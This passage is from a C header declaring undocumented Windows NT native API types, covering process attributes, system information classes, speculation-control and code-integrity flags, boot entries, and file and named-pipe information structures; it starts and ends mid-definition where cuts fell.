    PsAttributeValue(PsAttributeProtectionLevel, FALSE, TRUE, TRUE)
#define PS_ATTRIBUTE_SECURE_PROCESS \
    PsAttributeValue(PsAttributeSecureProcess, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_JOB_LIST \
    PsAttributeValue(PsAttributeJobList, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_CHILD_PROCESS_POLICY \
    PsAttributeValue(PsAttributeChildProcessPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_ALL_APPLICATION_PACKAGES_POLICY \
    PsAttributeValue(PsAttributeAllApplicationPackagesPolicy, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_WIN32K_FILTER \
    PsAttributeValue(PsAttributeWin32kFilter, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_SAFE_OPEN_PROMPT_ORIGIN_CLAIM \
    PsAttributeValue(PsAttributeSafeOpenPromptOriginClaim, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_BNO_ISOLATION \
    PsAttributeValue(PsAttributeBnoIsolation, FALSE, TRUE, FALSE)
#define PS_ATTRIBUTE_DESKTOP_APP_POLICY \
    PsAttributeValue(PsAttributeDesktopAppPolicy, FALSE, TRUE, FALSE)

#define RTL_USER_PROC_PARAMS_NORMALIZED     0x00000001
#define RTL_USER_PROC_PROFILE_USER          0x00000002
#define RTL_USER_PROC_PROFILE_KERNEL        0x00000004
#define RTL_USER_PROC_PROFILE_SERVER        0x00000008
#define RTL_USER_PROC_RESERVE_1MB           0x00000020
#define RTL_USER_PROC_RESERVE_16MB          0x00000040
#define RTL_USER_PROC_CASE_SENSITIVE        0x00000080
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT 0x00000100
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL 0x00001000
#define RTL_USER_PROC_APP_MANIFEST_PRESENT  0x00002000
#define RTL_USER_PROC_IMAGE_KEY_MISSING     0x00004000
#define RTL_USER_PROC_OPTIN_PROCESS         0x00020000

/*
** Processes END
*/

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemProcessorInformation = 1,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemPathInformation = 4,
    SystemProcessInformation = 5,
    SystemCallCountInformation = 6,
    SystemDeviceInformation = 7,
    SystemProcessorPerformanceInformation = 8,
    SystemFlagsInformation = 9,
    SystemCallTimeInformation = 10,
    SystemModuleInformation = 11,
    SystemLocksInformation = 12,
    SystemStackTraceInformation = 13,
    SystemPagedPoolInformation = 14,
    SystemNonPagedPoolInformation = 15,
    SystemHandleInformation = 16,
    SystemObjectInformation = 17,
    SystemPageFileInformation = 18,
    SystemVdmInstemulInformation = 19,
    SystemVdmBopInformation = 20,
    SystemFileCacheInformation = 21,
    SystemPoolTagInformation = 22,
    SystemInterruptInformation = 23,
    SystemDpcBehaviorInformation = 24,
    SystemFullMemoryInformation = 25,
    SystemLoadGdiDriverInformation = 26,
    SystemUnloadGdiDriverInformation = 27,
    SystemTimeAdjustmentInformation = 28,
    SystemSummaryMemoryInformation = 29,
    SystemMirrorMemoryInformation = 30,
    SystemPerformanceTraceInformation = 31,
    SystemObsolete0 = 32,
    SystemExceptionInformation = 33,
    SystemCrashDumpStateInformation = 34,
    SystemKernelDebuggerInformation = 35,
    SystemContextSwitchInformation = 36,
    SystemRegistryQuotaInformation = 37,
    SystemExtendServiceTableInformation = 38,
    SystemPrioritySeperation = 39,
    SystemVerifierAddDriverInformation = 40,
    SystemVerifierRemoveDriverInformation = 41,
    SystemProcessorIdleInformation = 42,
    SystemLegacyDriverInformation = 43,
    SystemCurrentTimeZoneInformation = 44,
    SystemLookasideInformation = 45,
    SystemTimeSlipNotification = 46,
    SystemSessionCreate = 47,
    SystemSessionDetach = 48,
    SystemSessionInformation = 49,
    SystemRangeStartInformation = 50,
    SystemVerifierInformation = 51,
    SystemVerifierThunkExtend = 52,
    SystemSessionProcessInformation = 53,
    SystemLoadGdiDriverInSystemSpace = 54,
    SystemNumaProcessorMap = 55,
    SystemPrefetcherInformation = 56,
    SystemExtendedProcessInformation = 57,
    SystemRecommendedSharedDataAlignment = 58,
    SystemComPlusPackage = 59,
    SystemNumaAvailableMemory = 60,
    SystemProcessorPowerInformation = 61,
    SystemEmulationBasicInformation = 62,
    SystemEmulationProcessorInformation = 63,
    SystemExtendedHandleInformation = 64,
    SystemLostDelayedWriteInformation = 65,
    SystemBigPoolInformation = 66,
    SystemSessionPoolTagInformation = 67,
    SystemSessionMappedViewInformation = 68,
    SystemHotpatchInformation = 69,
    SystemObjectSecurityMode = 70,
    SystemWatchdogTimerHandler = 71,
    SystemWatchdogTimerInformation = 72,
    SystemLogicalProcessorInformation = 73,
    SystemWow64SharedInformationObsolete = 74,
    SystemRegisterFirmwareTableInformationHandler = 75,
    SystemFirmwareTableInformation = 76,
    SystemModuleInformationEx = 77,
    SystemVerifierTriageInformation = 78,
    SystemSuperfetchInformation = 79,
    SystemMemoryListInformation = 80,
    SystemFileCacheInformationEx = 81,
    SystemThreadPriorityClientIdInformation = 82,
    SystemProcessorIdleCycleTimeInformation = 83,
    SystemVerifierCancellationInformation = 84,
    SystemProcessorPowerInformationEx = 85,
    SystemRefTraceInformation = 86,
    SystemSpecialPoolInformation = 87,
    SystemProcessIdInformation = 88,
    SystemErrorPortInformation = 89,
    SystemBootEnvironmentInformation = 90,
    SystemHypervisorInformation = 91,
    SystemVerifierInformationEx = 92,
    SystemTimeZoneInformation = 93,
    SystemImageFileExecutionOptionsInformation = 94,
    SystemCoverageInformation = 95,
    SystemPrefetchPatchInformation = 96,
    SystemVerifierFaultsInformation = 97,
    SystemSystemPartitionInformation = 98,
    SystemSystemDiskInformation = 99,
    SystemProcessorPerformanceDistribution = 100,
    SystemNumaProximityNodeInformation = 101,
    SystemDynamicTimeZoneInformation = 102,
    SystemCodeIntegrityInformation = 103,
    SystemProcessorMicrocodeUpdateInformation = 104,
    SystemProcessorBrandString = 105,
    SystemVirtualAddressInformation = 106,
    SystemLogicalProcessorAndGroupInformation = 107,
    SystemProcessorCycleTimeInformation = 108,
    SystemStoreInformation = 109,
    SystemRegistryAppendString = 110,
    SystemAitSamplingValue = 111,
    SystemVhdBootInformation = 112,
    SystemCpuQuotaInformation = 113,
    SystemNativeBasicInformation = 114,
    SystemErrorPortTimeouts = 115,
    SystemLowPriorityIoInformation = 116,
    SystemBootEntropyInformation = 117,
    SystemVerifierCountersInformation = 118,
    SystemPagedPoolInformationEx = 119,
    SystemSystemPtesInformationEx = 120,
    SystemNodeDistanceInformation = 121,
    SystemAcpiAuditInformation = 122,
    SystemBasicPerformanceInformation = 123,
    SystemQueryPerformanceCounterInformation = 124,
    SystemSessionBigPoolInformation = 125,
    SystemBootGraphicsInformation = 126,
    SystemScrubPhysicalMemoryInformation = 127,
    SystemBadPageInformation = 128,
    SystemProcessorProfileControlArea = 129,
    SystemCombinePhysicalMemoryInformation = 130,
    SystemEntropyInterruptTimingInformation = 131,
    SystemConsoleInformation = 132,
    SystemPlatformBinaryInformation = 133,
    SystemPolicyInformation = 134,
    SystemHypervisorProcessorCountInformation = 135,
    SystemDeviceDataInformation = 136,
    SystemDeviceDataEnumerationInformation = 137,
    SystemMemoryTopologyInformation = 138,
    SystemMemoryChannelInformation = 139,
    SystemBootLogoInformation = 140,
    SystemProcessorPerformanceInformationEx = 141,
    SystemSpare0 = 142,
    SystemSecureBootPolicyInformation = 143,
    SystemPageFileInformationEx = 144,
    SystemSecureBootInformation = 145,
    SystemEntropyInterruptTimingRawInformation = 146,
    SystemPortableWorkspaceEfiLauncherInformation = 147,
    SystemFullProcessInformation = 148,
    SystemKernelDebuggerInformationEx = 149,
    SystemBootMetadataInformation = 150,
    SystemSoftRebootInformation = 151,
    SystemElamCertificateInformation = 152,
    SystemOfflineDumpConfigInformation = 153,
    SystemProcessorFeaturesInformation = 154,
    SystemRegistryReconciliationInformation = 155,
    SystemEdidInformation = 156,
    SystemManufacturingInformation = 157,
    SystemEnergyEstimationConfigInformation = 158,
    SystemHypervisorDetailInformation = 159,
    SystemProcessorCycleStatsInformation = 160,
    SystemVmGenerationCountInformation = 161,
    SystemTrustedPlatformModuleInformation = 162,
    SystemKernelDebuggerFlags = 163,
    SystemCodeIntegrityPolicyInformation = 164,
    SystemIsolatedUserModeInformation = 165,
    SystemHardwareSecurityTestInterfaceResultsInformation = 166,
    SystemSingleModuleInformation = 167,
    SystemAllowedCpuSetsInformation = 168,
    SystemDmaProtectionInformation = 169,
    SystemInterruptCpuSetsInformation = 170,
    SystemSecureBootPolicyFullInformation = 171,
    SystemCodeIntegrityPolicyFullInformation = 172,
    SystemAffinitizedInterruptProcessorInformation = 173,
    SystemRootSiloInformation = 174,
    SystemCpuSetInformation = 175,
    SystemCpuSetTagInformation = 176,
    SystemWin32WerStartCallout = 177,
    SystemSecureKernelProfileInformation = 178,
    SystemCodeIntegrityPlatformManifestInformation = 179,
    SystemInterruptSteeringInformation = 180,
    SystemSupportedProcessorArchitectures = 181,
    SystemMemoryUsageInformation = 182,
    SystemCodeIntegrityCertificateInformation = 183,
    SystemPhysicalMemoryInformation = 184,
    SystemControlFlowTransition = 185,
    SystemKernelDebuggingAllowed = 186,
    SystemActivityModerationExeState = 187,
    SystemActivityModerationUserSettings = 188,
    SystemCodeIntegrityPoliciesFullInformation = 189,
    SystemCodeIntegrityUnlockInformation = 190,
    SystemIntegrityQuotaInformation = 191,
    SystemFlushInformation = 192,
    SystemProcessorIdleMaskInformation = 193,
    SystemSecureDumpEncryptionInformation = 194,
    SystemWriteConstraintInformation = 195,
    SystemKernelVaShadowInformation = 196,
    SystemHypervisorSharedPageInformation = 197,
    SystemFirmwareBootPerformanceInformation = 198,
    SystemCodeIntegrityVerificationInformation = 199,
    SystemFirmwarePartitionInformation = 200,
    SystemSpeculationControlInformation = 201,
    SystemDmaGuardPolicyInformation = 202,
    SystemEnclaveLaunchControlInformation = 203,
    SystemWorkloadAllowedCpuSetsInformation = 204,
    SystemCodeIntegrityUnlockModeInformation = 205,
    SystemLeapSecondInformation = 206,
    SystemFlags2Information = 207,
    MaxSystemInfoClass
} SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;

//msdn.microsoft.com/en-us/library/windows/desktop/ms724509(v=vs.85).aspx
typedef struct _SYSTEM_SPECULATION_CONTROL_INFORMATION {
    struct {
        ULONG BpbEnabled : 1;
        ULONG BpbDisabledSystemPolicy : 1;
        ULONG BpbDisabledNoHardwareSupport : 1;
        ULONG SpecCtrlEnumerated : 1;
        ULONG SpecCmdEnumerated : 1;
        ULONG IbrsPresent : 1;
        ULONG StibpPresent : 1;
        ULONG SmepPresent : 1;
        ULONG SpeculativeStoreBypassDisableAvailable : 1;
        ULONG SpeculativeStoreBypassDisableSupported : 1;
        ULONG SpeculativeStoreBypassDisabledSystemWide : 1;
        ULONG SpeculativeStoreBypassDisabledKernel : 1;
        ULONG SpeculativeStoreBypassDisableRequired : 1;
        ULONG BpbDisabledKernelToUser : 1;
        ULONG SpecCtrlRetpolineEnabled : 1;
        ULONG SpecCtrlImportOptimizationEnabled : 1;
        ULONG Reserved : 16;
    } SpeculationControlFlags;
} SYSTEM_SPECULATION_CONTROL_INFORMATION, *PSYSTEM_SPECULATION_CONTROL_INFORMATION;

typedef struct _SYSTEM_KERNEL_VA_SHADOW_INFORMATION {
    struct {
        ULONG KvaShadowEnabled : 1;
        ULONG KvaShadowUserGlobal : 1;
        ULONG KvaShadowPcid : 1;
        ULONG KvaShadowInvpcid : 1;
        ULONG KvaShadowRequired : 1;
        ULONG KvaShadowRequiredAvailable : 1;
        ULONG InvalidPteBit : 6;
        ULONG L1DataCacheFlushSupported : 1;
        ULONG L1TerminalFaultMitigationPresent : 1;
        ULONG Reserved : 18;
    } KvaShadowFlags;
} SYSTEM_KERNEL_VA_SHADOW_INFORMATION, *PSYSTEM_KERNEL_VA_SHADOW_INFORMATION;

typedef struct _SYSTEM_CODEINTEGRITY_INFORMATION {
    ULONG  Length;
    ULONG  CodeIntegrityOptions;
} SYSTEM_CODEINTEGRITY_INFORMATION, *PSYSTEM_CODEINTEGRITY_INFORMATION;

#define CODEINTEGRITY_OPTION_ENABLED                      0x01
#define CODEINTEGRITY_OPTION_TESTSIGN                     0x02
#define CODEINTEGRITY_OPTION_UMCI_ENABLED                 0x04
#define CODEINTEGRITY_OPTION_UMCI_AUDITMODE_ENABLED       0x08
#define CODEINTEGRITY_OPTION_UMCI_EXCLUSIONPATHS_ENABLED  0x10
#define CODEINTEGRITY_OPTION_TEST_BUILD                   0x20
#define CODEINTEGRITY_OPTION_PREPRODUCTION_BUILD          0x40
#define CODEINTEGRITY_OPTION_DEBUGMODE_ENABLED            0x80
#define CODEINTEGRITY_OPTION_FLIGHT_BUILD                 0x100
#define CODEINTEGRITY_OPTION_FLIGHTING_ENABLED            0x200
#define CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED            0x400
#define CODEINTEGRITY_OPTION_HVCI_KMCI_AUDITMODE_ENABLED  0x800
#define CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED 0x1000
#define CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED             0x2000

typedef VOID(NTAPI *PIO_APC_ROUTINE)(
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );

#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef struct _SYSTEM_VHD_BOOT_INFORMATION {
    BOOLEAN OsDiskIsVhd;
    ULONG OsVhdFilePathOffset;
    WCHAR OsVhdParentVolume[ANYSIZE_ARRAY];
} SYSTEM_VHD_BOOT_INFORMATION, *PSYSTEM_VHD_BOOT_INFORMATION;

typedef struct _SYSTEM_OBJECTTYPE_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfObjects;
    ULONG NumberOfHandles;
    ULONG TypeIndex;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    ULONG PoolType;
    BOOLEAN SecurityRequired;
    BOOLEAN WaitableObject;
    UNICODE_STRING TypeName;
} SYSTEM_OBJECTTYPE_INFORMATION, *PSYSTEM_OBJECTTYPE_INFORMATION;

typedef struct _SYSTEM_OBJECT_INFORMATION {
    ULONG NextEntryOffset;
    PVOID Object;
    HANDLE CreatorUniqueProcess;
    USHORT CreatorBackTraceIndex;
    USHORT Flags;
    LONG PointerCount;
    LONG HandleCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    HANDLE ExclusiveProcessId;
    PVOID SecurityDescriptor;
    UNICODE_STRING NameInfo;
} SYSTEM_OBJECT_INFORMATION, *PSYSTEM_OBJECT_INFORMATION;

/*
** Boot Entry START
*/

typedef struct _FILE_PATH {
    ULONG Version;
    ULONG Length;
    ULONG Type;
    UCHAR FilePath[ANYSIZE_ARRAY];
} FILE_PATH, *PFILE_PATH;

typedef struct _BOOT_ENTRY {
    ULONG Version;
    ULONG Length;
    ULONG Id;
    ULONG Attributes;
    ULONG FriendlyNameOffset;
    ULONG BootFilePathOffset;
    ULONG OsOptionsLength;
    UCHAR OsOptions[ANYSIZE_ARRAY];
} BOOT_ENTRY, *PBOOT_ENTRY;

typedef struct _BOOT_ENTRY_LIST {
    ULONG NextEntryOffset;
    BOOT_ENTRY BootEntry;
} BOOT_ENTRY_LIST, *PBOOT_ENTRY_LIST;

/*
** Boot Entry END
*/

/*
** File start
*/

#define FILE_SUPERSEDE                          0x00000000
#define FILE_OPEN                               0x00000001
#define FILE_CREATE                             0x00000002
#define FILE_OPEN_IF                            0x00000003
#define FILE_OVERWRITE                          0x00000004
#define FILE_OVERWRITE_IF                       0x00000005
#define FILE_MAXIMUM_DISPOSITION                0x00000005

#define FILE_DIRECTORY_FILE                     0x00000001
#define FILE_WRITE_THROUGH                      0x00000002
#define FILE_SEQUENTIAL_ONLY                    0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING          0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT               0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#define FILE_NON_DIRECTORY_FILE                 0x00000040
#define FILE_CREATE_TREE_CONNECTION             0x00000080

#define FILE_COMPLETE_IF_OPLOCKED               0x00000100
#define FILE_NO_EA_KNOWLEDGE                    0x00000200
#define FILE_OPEN_FOR_RECOVERY                  0x00000400
#define FILE_RANDOM_ACCESS                      0x00000800

#define FILE_DELETE_ON_CLOSE                    0x00001000
#define FILE_OPEN_BY_FILE_ID                    0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT             0x00004000
#define FILE_NO_COMPRESSION                     0x00008000

#define FILE_RESERVE_OPFILTER                   0x00100000
#define FILE_OPEN_REPARSE_POINT                 0x00200000
#define FILE_OPEN_NO_RECALL                     0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY          0x00800000


#define FILE_COPY_STRUCTURED_STORAGE            0x00000041
#define FILE_STRUCTURED_STORAGE                 0x00000441

#define FILE_VALID_OPTION_FLAGS                 0x00ffffff
#define FILE_VALID_PIPE_OPTION_FLAGS            0x00000032
#define FILE_VALID_MAILSLOT_OPTION_FLAGS        0x00000032
#define FILE_VALID_SET_FLAGS                    0x00000036

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileDispositionInformationEx,
    FileRenameInformationEx,
    FileRenameInformationExBypassAccessCheck,
    FileDesiredStorageClassInformation,
    FileStatInformation,
    FileMemoryPartitionInformation,
    FileStatLxInformation,
    FileCaseSensitiveInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS {
    FileFsVolumeInformation = 1,
    FileFsLabelInformation,
    FileFsSizeInformation,
    FileFsDeviceInformation,
    FileFsAttributeInformation,
    FileFsControlInformation,
    FileFsFullSizeInformation,
    FileFsObjectIdInformation,
    FileFsDriverPathInformation,
    FileFsVolumeFlagsInformation,
    FileFsSectorSizeInformation,
    FileFsDataCopyInformation,
    FileFsMetadataSizeInformation,
    FileFsMaximumInformation
} FS_INFORMATION_CLASS, *PFS_INFORMATION_CLASS;

typedef struct _FILE_BASIC_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    UCHAR DeletePending;
    UCHAR Directory;
} FILE_STANDARD_INFORMATION;

typedef struct _FILE_STANDARD_INFORMATION_EX {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
    BOOLEAN AlternateStream;
    BOOLEAN MetadataAttribute;
} FILE_STANDARD_INFORMATION_EX, *PFILE_STANDARD_INFORMATION_EX;

typedef struct _FILE_INTERNAL_INFORMATION {
    LARGE_INTEGER IndexNumber;
} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;

typedef struct _FILE_EA_INFORMATION {
    ULONG EaSize;
} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;

typedef struct _FILE_ACCESS_INFORMATION {
    ACCESS_MASK AccessFlags;
} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;

typedef struct _FILE_POSITION_INFORMATION {
    LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;

typedef struct _FILE_MODE_INFORMATION {
    ULONG Mode;
} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;

typedef struct _FILE_ALIGNMENT_INFORMATION {
    ULONG AlignmentRequirement;
} FILE_ALIGNMENT_INFORMATION, *PFILE_ALIGNMENT_INFORMATION;

typedef struct _FILE_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;

typedef struct _FILE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION BasicInformation;
    FILE_STANDARD_INFORMATION StandardInformation;
    FILE_INTERNAL_INFORMATION InternalInformation;
    FILE_EA_INFORMATION EaInformation;
    FILE_ACCESS_INFORMATION AccessInformation;
    FILE_POSITION_INFORMATION PositionInformation;
    FILE_MODE_INFORMATION ModeInformation;
    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
    FILE_NAME_INFORMATION NameInformation;
} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;

typedef struct _FILE_NETWORK_OPEN_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG FileAttributes;
} FILE_NETWORK_OPEN_INFORMATION, *PFILE_NETWORK_OPEN_INFORMATION;

typedef struct _FILE_ATTRIBUTE_TAG_INFORMATION {
    ULONG FileAttributes;
    ULONG ReparseTag;
} FILE_ATTRIBUTE_TAG_INFORMATION, *PFILE_ATTRIBUTE_TAG_INFORMATION;

typedef struct _FILE_ALLOCATION_INFORMATION {
    LARGE_INTEGER AllocationSize;
} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;

typedef struct _FILE_COMPRESSION_INFORMATION {
    LARGE_INTEGER CompressedFileSize;
    USHORT CompressionFormat;
    UCHAR CompressionUnitShift;
    UCHAR ChunkShift;
    UCHAR ClusterShift;
    UCHAR Reserved[3];
} FILE_COMPRESSION_INFORMATION, *PFILE_COMPRESSION_INFORMATION;

typedef struct _FILE_DISPOSITION_INFORMATION {
    BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, *PFILE_DISPOSITION_INFORMATION;

typedef struct _FILE_END_OF_FILE_INFORMATION {
    LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;

typedef struct _FILE_VALID_DATA_LENGTH_INFORMATION {
    LARGE_INTEGER ValidDataLength;
} FILE_VALID_DATA_LENGTH_INFORMATION, *PFILE_VALID_DATA_LENGTH_INFORMATION;

typedef struct _FILE_LINK_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_INFORMATION, *PFILE_LINK_INFORMATION;

typedef struct _FILE_MOVE_CLUSTER_INFORMATION {
    ULONG ClusterCount;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_MOVE_CLUSTER_INFORMATION, *PFILE_MOVE_CLUSTER_INFORMATION;

typedef struct _FILE_RENAME_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE RootDirectory;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_RENAME_INFORMATION, *PFILE_RENAME_INFORMATION;

typedef struct _FILE_STREAM_INFORMATION {
    ULONG NextEntryOffset;
    ULONG StreamNameLength;
    LARGE_INTEGER StreamSize;
    LARGE_INTEGER StreamAllocationSize;
    WCHAR StreamName[1];
} FILE_STREAM_INFORMATION, *PFILE_STREAM_INFORMATION;

typedef struct _FILE_TRACKING_INFORMATION {
    HANDLE DestinationFile;
    ULONG ObjectInformationLength;
    CHAR ObjectInformation[1];
} FILE_TRACKING_INFORMATION, *PFILE_TRACKING_INFORMATION;

typedef struct _FILE_COMPLETION_INFORMATION {
    HANDLE Port;
    PVOID Key;
} FILE_COMPLETION_INFORMATION, *PFILE_COMPLETION_INFORMATION;

//
// Define the NamedPipeType flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_BYTE_STREAM_TYPE      0x00000000
#define FILE_PIPE_MESSAGE_TYPE          0x00000001

//
// Define the CompletionMode flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_QUEUE_OPERATION       0x00000000
#define FILE_PIPE_COMPLETE_OPERATION    0x00000001

//
// Define the ReadMode flags for NtCreateNamedPipeFile
//

#define FILE_PIPE_BYTE_STREAM_MODE      0x00000000
#define FILE_PIPE_MESSAGE_MODE          0x00000001

//
// Define the NamedPipeConfiguration flags for NtQueryInformation
//

#define FILE_PIPE_INBOUND               0x00000000
#define FILE_PIPE_OUTBOUND              0x00000001
#define FILE_PIPE_FULL_DUPLEX           0x00000002

//
// Define the NamedPipeState flags for NtQueryInformation
//

#define FILE_PIPE_DISCONNECTED_STATE    0x00000001
#define FILE_PIPE_LISTENING_STATE       0x00000002
#define FILE_PIPE_CONNECTED_STATE       0x00000003
#define FILE_PIPE_CLOSING_STATE         0x00000004

//
// Define the NamedPipeEnd flags for NtQueryInformation
//

#define FILE_PIPE_CLIENT_END            0x00000000
#define FILE_PIPE_SERVER_END            0x00000001


typedef struct _FILE_PIPE_INFORMATION {
    ULONG ReadMode;
    ULONG CompletionMode;
} FILE_PIPE_INFORMATION, *PFILE_PIPE_INFORMATION;

typedef struct _FILE_PIPE_LOCAL_INFORMATION {
    ULONG NamedPipeType;
    ULONG NamedPipeConfiguration;
    ULONG MaximumInstances;
    ULONG CurrentInstances;
    ULONG InboundQuota;
    ULONG ReadDataAvailable;
    ULONG OutboundQuota;
    ULONG WriteQuotaAvailable;
    ULONG NamedPipeState;
    ULONG NamedPipeEnd;
} FILE_PIPE_LOCAL_INFORMATION, *PFILE_PIPE_LOCAL_INFORMATION;

typedef struct _FILE_PIPE_REMOTE_INFORMATION {
    LARGE_INTEGER CollectDataTime;
    ULONG MaximumCollectionCount;
} FILE_PIPE_REMOTE_INFORMATION, *PFILE_PIPE_REMOTE_INFORMATION;

typedef struct _FILE_MAILSLOT_QUERY_INFORMATION {
    ULONG MaximumMessageSize;
    ULONG MailslotQuota;
    ULONG NextMessageSize;
    ULONG MessagesAvailable;
    LARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_QUERY_INFORMATION, *PFILE_MAILSLOT_QUERY_INFORMATION;

typedef struct _FILE_MAILSLOT_SET_INFORMATION {
    PLARGE_INTEGER ReadTimeout;
} FILE_MAILSLOT_SET_INFORMATION, *PFILE_MAILSLOT_SET_INFORMATION;

typedef struct _FILE_REPARSE_POINT_INFORMATION {
    LONGLONG FileReference;
    ULONG Tag;
} FILE_REPARSE_POINT_INFORMATION, *PFILE_REPARSE_POINT_INFORMATION;

typedef struct _FILE_LINK_ENTRY_INFORMATION {
    ULONG NextEntryOffset;
    LONGLONG ParentFileId;
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_LINK_ENTRY_INFORMATION, *PFILE_LINK_ENTRY_INFORMATION;

typedef struct _FILE_LINKS_INFORMATION {
    ULONG BytesNeeded;
    ULONG EntriesReturned;
    FILE_LINK_ENTRY_INFORMATION Entry;
} FILE_LINKS_INFORMATION, *PFILE_LINKS_INFORMATION;

typedef struct _FILE_NETWORK_PHYSICAL_NAME_INFORMATION {
    ULONG FileNameLength;
    WCHAR FileName[1];
} FILE_NETWORK_PHYSICAL_NAME_INFORMATION, *PFILE_NETWORK_PHYSICAL_NAME_INFORMATION;

typedef struct _FILE_STANDARD_LINK_INFORMATION {
    ULONG NumberOfAccessibleLinks;
    ULONG TotalNumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_LINK_INFORMATION, *PFILE_STANDARD_LINK_INFORMATION;

typedef struct _FILE_SFIO_RESERVE_INFORMATION {
    ULONG RequestsPerPeriod;
    ULONG Period;
    BOOLEAN RetryFailures;
    BOOLEAN Discardable;
